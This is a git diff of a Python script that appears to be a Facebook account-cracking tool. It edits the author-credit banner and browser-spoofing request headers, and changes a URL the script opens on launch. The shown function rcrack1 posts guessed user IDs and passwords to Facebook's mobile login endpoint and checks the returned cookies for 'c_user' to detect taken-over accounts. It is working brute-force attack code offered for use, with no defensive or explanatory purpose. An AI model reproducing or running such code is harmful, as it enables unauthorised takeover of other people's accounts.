@@ -72,9 +72,9 @@ for xd in range(10000):
     f=random.randrange(1, 99)
     uaku2=(f'{a}{b}{c}{d}{e}{f}')
     ugen.append(uaku2)
-os.system('xdg-open https://github.com/akashmatli')
+os.system('xdg-open https://www.facebook.com/mdbipul.khan.1420354')
 logo = ("""
-    __________._____________ ____ ___.____     
+  __________._____________ ____ ___.____     
 \______   \   \______   \    |   \    |    
  |    |  _/   ||     ___/    |   /    |    
  |    |   \   ||    |   |    |  /|    |___ 
@@ -89,7 +89,7 @@ logo = ("""
  ┃ [✓] GITHUB    \033[1;91m: \033[1;92mbipul159            ┃
  ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mBIPUL KHAN              ┃
  ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+8801759★★★★★★
- ┃ [√]VERSION            \033[1;91m: \033[1;92m1.1
+ ┃ [√]VERSION      \033[1;91m: \033[1;92m1.1
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
 
 class Main:
@@ -206,25 +206,24 @@ def rcrack1(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {
-    'authority': 'mbasic.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'referer': 'https://www.google.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"8.1.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'cross-site',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-    'viewport-width': '980',
-}
+            'authority': 'mbasic.facebook.com',
+            'method': 'GET',
+            'scheme': 'https',
+            'path': '/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'origin': 'https://mbasic.facebook.com',
+            'referer': 'https://mbasic.facebook.com/',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
